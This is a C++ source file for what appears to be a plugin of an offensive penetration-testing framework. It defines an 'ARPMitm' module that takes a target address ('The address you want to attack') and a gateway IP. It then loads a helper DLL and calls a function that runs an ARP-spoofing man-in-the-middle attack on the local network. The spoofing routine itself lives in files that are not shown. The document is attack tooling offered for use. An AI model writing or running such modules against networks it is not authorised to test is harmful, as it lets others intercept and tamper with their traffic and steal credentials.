#include "../../Module/ModuleBase.h"
#include "../../Utils/Color.h"
#include "../ARPT.h"
#include <iostream>
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <filesystem>
#include <cstdio>
#include <format>
#include <cstdlib>
#include <cstring>
#include <cstdint>

class ARPMitm : public ModuleBase
{
public:
    ARPMitm()
    {
        RegisterOption("RHOST", std::make_unique<OptString>(
            "", OptionRequired::Required,
            "The address you want to attack"));
        RegisterOption("Gateway IP", std::make_unique<OptString>(
            "", OptionRequired::Required,
            "The gateway ip address"));
    }

    ModuleInfo Info() const override
    {
        ModuleInfo Info;
        Info.Name = "LocalNetwork/ARPMitm";
        Info.Description = "ARPMitm Tool";
        Info.Author = "RegistryEdit";
        Info.License = "DLL_LICENSE";
        Info.Type = ModuleType::Auxiliary;
        Info.Targets = { "Windows 10 x64", "Windows 11 x64" };
        Info.DefaultTarget = "Windows 10 x64";
        Info.Platform = { "Windows" };
        Info.Arch = "x64";
        Info.DisclosureDate = "NULL";
        Info.References = { "NULL", "NULL" };
        Info.Rank = 300;
        return Info;
    }

    bool Check() override
    {
        Color::PrintInfo() << "Checking if the module is compatible with the current system..." << std::endl;
        return true;
    }

    bool Run() override
    {
        ArpDll Dll = ArpLoad();
        if (!Dll.Module) {
            Color::PrintBad() << "Failed to load ARPDepend DLL." << std::endl;
            return false;
        }
        std::cout << std::endl;
        MitmA(&Dll, GetOption("RHOST").c_str(), GetOption("Gateway IP").c_str());
        return true;
    }
};


// StopModule - graceful stop via GetProcAddress
extern "C" __declspec(dllexport) void StopModule() { ArptControl::RequestStop(); }
BOOL APIENTRY DllMain(HMODULE, DWORD Reason, LPVOID)
{
    if (Reason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(GetModuleHandle(nullptr));
    return TRUE;
}

extern "C" __declspec(dllexport) ModuleBase* CreateModule()
{
    return new ARPMitm();
}

extern "C" __declspec(dllexport) void DestroyModule(ModuleBase* Module)
{
    delete Module;
}
